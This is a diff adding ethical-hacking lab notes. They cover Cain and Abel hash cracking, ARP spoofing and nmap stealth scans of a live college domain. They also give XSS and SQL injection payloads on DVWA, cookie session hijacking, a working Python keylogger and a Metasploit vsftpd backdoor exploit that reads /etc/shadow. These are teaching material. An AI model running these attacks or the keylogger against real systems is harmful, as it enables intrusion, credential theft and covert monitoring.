@@ -1,0 +1,235 @@
+ETH prac
+ETH practical Notes
+
+Pr2
+A. Cryptool for Encryption and Decryption
+
+	Steps:
+		1. Open Cryptool
+		2. You will see a .txt file delete everything in it.
+		3. Now write some text in it like "Hello World"
+		4. Go to Encrypt/Decrypt &gt; Symmetric(modern) &gt; RC4
+		5. Keep the key length 8 bit; change 00 to something like "12"
+		6. Click on Encrypt. (Encrypted Text is now visible)
+		7. Again go to Encrypt/Decrypt &gt; Symmetric(modern) &gt; RC4
+		8. Keep the key length 8 bit; and change 00 by "12"
+		9. Click on Decrypt. (Decrypted text is now visible).
+		
+
+B. Cain and Abel for windows password cracking
+	Steps:
+		1. Launch Cain
+		2. Go to Crackers &gt; LM &amp; NTLM Hashes
+		3. Click on blue + icon on top &gt; select include password history             hashes &gt; next
+		4. Right Click on ITCS &gt; Dictionary Attack &gt; NTLM Hashes
+		5. right click on the wordlist file and Remove it
+		6. Again right click &gt; add to list &gt; wordlist.txt
+		7. Click start 
+		8. after completetion click exit password will be visible.
+
+C. Cain and Abel for decode hash
+	Steps:
+		1. Open Cain
+		2. Select Crackers &gt; MD5 Hashes
+		3. Click on Hash Calculator
+		4. Type in a Text &gt; click calculate &gt; copy the MD5 hash value &gt; exit
+		5. Click on the screen and click on add(+) paste the hash value.
+		6. Right click on hash value and select dictionary attack.
+		7. Right click on the file section and click add to list. 
+		8. select Wordlist.txt file.
+		9. clcik start
+
+====================================================================================
+		
+Pr3
+A.Linux Network Analysis
+	Steps:
+		1. Launch Kali Linux
+		2. Open Terminal
+		3. Enter the following commands.
+			i.  ifconfig
+			ii. ping www.google.com (press Cltr + C to stop the ping)
+			iii.netstat
+			iv. traceroute www.google.com
+
+B.ARP poisoning
+	Steps:
+		1. Launch Kali Linux
+		2. Open Terminal
+		3. Enter the following commands
+			i.  arp -a  
+				o/p: ? (192.168.0.1) at <incomplete> on eth0
+			ii. sudo arp -s 192.168.0.1 1a:2b:3c:4d:5e:1a
+				o/p: [sudo] password for kali: 
+																																					   
+			iii. arp -a
+				 o/p:	? (192.168.0.1) at 1a:2b:3c:4d:5e:1a [ether] PERM on eth0
+						? (192.168.0.1) at 1a:2b:3c:4d:5e:1a [ether] PERM on eth0
+				
+==================================================================================
+Pr4
+A. Using namp to perform -ACK, SYN, FIN, NULL, XMAS
+	Steps:
+		1. 1. Launch Kali Linux
+		2. Open Terminal
+		3. Enter the following commands
+			a. ACK Scan: sudo nmap -sA -T4 www.ruparel.edu
+			b. SYN Scan: sudo nmap -sS -T4 www.ruparel.edu
+			c. FIN Scan: sudo nmap -sF -T4 www.ruparel.edu
+			d. NULL Scan: sudo nmap -sN -T4 www.ruparel.edu
+			e. XMAS Scan: sudo nmap -sX -T4 www.ruparel.edu
+			
+B. port scanning using namp
+			nmap -p22,113,139 www.ruparel.edu
+			
+==================================================================================
+Pr5
+A. Network Analysis using Wireshark
+	Steps:
+		1. Open Wireshark and start recording.
+		2. Apply "http" filter
+		3. go to http://testphp.vulnweb.com/login.php
+		4. enter username and password &gt; click login
+		5. come back to wireshark and double click on userinfo.php file
+		6. on the new window uname and pass will be visible under URL encoded section
+		
+B. DOS using nemesis
+	Steps:
+		1. Download Nemesis from https://sourceforge.net/projects/nemesisddos/files/NEMESIS%201.0.0.zip/download
+		2. Extract the file
+		3. go into the folder and open cmd
+		4. type the command nemesis
+		
+=========================================================================================
+Pr6
+A. Cross Site Scripting attack
+	Steps:
+		1.  Launch Kali linux terminal and run the following commands
+		2.  sudo apt update
+		3.  sudo apt install -y apache2 mariadb-server mariadb-client php php-mysqli php-gd libapache2-mod-php
+		4.  sudo apt install git
+		5.  wget https://raw.githubusercontent.com/IamCarron/DVWA-Script/main/Install-DVWA.sh
+		6.  chmod +x Install-DVWA.sh
+		7.  sudo ./Install-DVWA.sh
+		8.  open browser type in the url localhost/DVWA
+		9.  credentials to login is admin &amp; password
+		10. go to third option Setup/Reset DB &gt; scroll down and reset the database
+		11. go to 4th last option DVWA Security and set security to low
+		12. go to XSS(Stored) and enter the folllowing database
+				Name: test1
+				Message: <script>alert("Attack")</script>
+				and click sign
+		
+===================================================================================================================
+Pr7
+A. Tamper Data
+	Steps:
+		1. Open Firefox browser and Search for "Add ons"
+		2. Go to Firefox addons website
+		3. Search for "Tamper Data for FF Quantum" and add the extension to firefox
+		4. Go to https://opensource-demo.orangehrmlive.com/web/index.php/auth/login
+		5. while being on the login page turn on the tamper data extension(Click Yes)
+		6. Enter username and password as Admin &amp;&amp; admin123 and click enter.
+		7. Tamper data window will pop-up.
+		
+B. Cookie Manager
+	Steps:
+		1. Open Firefox browser and Search for "Add ons"
+		2. Go to Firefox addons website
+		3. Search for "Cookie Manager by Rob W" and add the extension to firefox
+		4. Go to https://opensource-demo.orangehrmlive.com/web/index.php/auth/login
+		5. Enter username and password as Admin &amp;&amp; admin123 and click enter.
+		6. Go to Cookie Manager Add on &gt; Open Cookie manager for Current page &gt; select the orangehmr cookie &gt; More action &gt;
+			Export select cookies &gt; Export &gt; json file will be downloaded open it with notepad
+		
+Prac7 Update
+A. Tamper Data
+	Steps:
+		1. Open Firefox browser and Search for "Add ons"
+		2. Go to Firefox addons website
+		3. Search for "Tamper Data for FF Quantum" and add the extension to firefox
+		4. Search for "EditThisCookie" and add the extension to firefox.
+		5. Go to website "www.techpanda.org" and login using the credentials admin@gmail.com &amp;&amp; password2010
+		6. Now go to Editthiscookie add-on and export the cookie (its the third button from right, looks like this([=&gt;))
+		7. The Cookie will be copied to the clipboard paste it in the notepad.
+		8. Go to tamper data add-on &gt; click yes &gt; open new tab and go to "www.techpanda.org/index.php" 
+		9. tamper data pop up will appear click ok
+		10. if(you can see cookie section)
+				{clcik ok &gt; again click ok &gt; again click ok &gt; now you will be able to login without entering the is &amp;&amp; pass }
+		11. else{	Click on add header and Add the name as "Cookie" and value as PHPSESSID=b70b30c4dfc5bdab5577ca08b0eb2cd5  
+you wil get these values from the cookies you have pasted on notepad
+click ok a couple of time you will be loggedin}
+		
+B. Cookie Manager
+	Steps:
+		1. Open Firefox browser and Search for "Add ons"
+		2. Go to Firefox addons website
+		3. Search for "Cookie Manager by Rob W" and add the extension to firefox
+		4. Go to https://opensource-demo.orangehrmlive.com/web/index.php/auth/login
+		5. Enter username and password as Admin &amp;&amp; admin123 and click enter.
+		6. Go to Cookie Manager Add on &gt; Open Cookie manager for Current page &gt; select the orangehmr cookie &gt; More action &gt;
+			Export select cookies &gt; Export &gt; json file will be downloaded open it with notepad
+
+===================================================================================================================
+Pr8
+A. SQL Injection			
+	Steps:
+		1.  Launch Kali linux terminal and run the following commands
+		2.  sudo apt update
+		3.  sudo apt install -y apache2 mariadb-server mariadb-client php php-mysqli php-gd libapache2-mod-php
+		4.  sudo apt install git
+		5.  wget https://raw.githubusercontent.com/IamCarron/DVWA-Script/main/Install-DVWA.sh
+		6.  chmod +x Install-DVWA.sh
+		7.  sudo ./Install-DVWA.sh
+		8.  open browser type in the url localhost/DVWA
+		9.  credentials to login is admin &amp; password
+		10. go to third option Setup/Reset DB &gt; scroll down and reset the database
+		11. go to 4th last option DVWA Security and set security to low
+		12. go to SQL Injection and type
+			a. 1
+			b. ' OR '' = '
+			c. ' UNION SELECT user, password FROM users-- (this is to get password md5 hashed)
+			d. 1 = 1
+			e. 1*
+			
+=====================================================================================================
+Pr9
+Python Code:
+
+from pynput.keyboard import Key, Listener
+import logging
+log_dir = ""
+logging.basicConfig(filename=(log_dir+"key_log.txt"), level=logging.DEBUG,
+format='%(asctime)s:%(message)s:')
+def on_press(key):
+    logging.info(str(key))
+with Listener(on_press=on_press) as listener:
+    listener.join()
+
+======================================================================================================
+Pr10
+A. MetaSploit
+	Steps:
+		1.  Download Kali from https://cdimage.kali.org/kali-2024.1/kali-linux-2024.1-virtualbox-amd64.7z and Extract the file.
+		2.  Open the "kali-linux-2024.1-virtualbox-amd64.vbox" file it has a blue icon
+		3.  Kali will launch in Virtualbox Username and Password is kali &amp;&amp; kali
+		4.  Download MetaSploitable 2 from https://sourceforge.net/projects/metasploitable/files/Metasploitable2/ and Extract the Zip.
+		5.  Watch these videos https://youtu.be/MY31DZiAPYA?si=C8efGCKmQoXsIh7q &amp;&amp; https://youtu.be/6y-xqGoY9MY?si=-6rPuUpyprtGNvsq
+		6.  Now both the machies should be on the same network.
+		7.  Launch both the machines and open terminal in kali; keep them side by side
+		8.  On metasploitable 2 enter the commanipd "ipconfig" and take note of ip address under eth0 &gt; inet
+		9.  On kali terminal ping matasploitable 2 using ping command "ping <ip_addresss>"
+		10. Press CTRL + C to stop the ping ; if the ping is successful we can proceed.
+		11. On kali run the following commands,
+				a. nmap -sV -O <ip_addresss>    Note: -O(Capital O not 0)
+				b. msfconcole
+				c. search type:exploit vsftpd
+				d. use exploit/unix/ftp/vsftpd_234_backdoor
+				e. show options
+				f. set RHOSTS 10.0.2.4
+				g. exploit
+				h. ls -l
+				i. cat /etc/shadow
+			
+============================================================================================================
+</ip_addresss></ip_addresss></incomplete>
